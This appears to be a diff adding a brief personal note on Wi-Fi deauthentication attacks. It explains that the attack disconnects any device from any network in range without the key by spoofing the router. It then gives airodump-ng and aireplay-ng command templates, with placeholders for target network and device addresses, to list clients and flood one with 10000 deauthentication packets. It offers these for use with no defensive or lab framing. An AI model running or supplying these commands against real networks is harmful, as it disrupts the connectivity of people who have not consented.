@@ -1,0 +1,10 @@
+//Deauthentication
+- Is used to disconnect any device form any network within your range without the network key.
+- Is done by pretending to be the target machine by spoofing its MAC address (pretending to be the target machine)
+- Meanwhile sending packets to the target machine (as the router) that it need to re-authenticate itself
+
+//To see which clients are currently connected
+airodump-ng --channel (CHANNELOFNETWORK) --bssid (MACADRESSSOFNETWORK) mon0
+
+//To deauth one of the devices
+aireplay-ng --deauth 10000 -a (NETWORKMACADRESS) -c (DEVICEMACADRESS) mon0
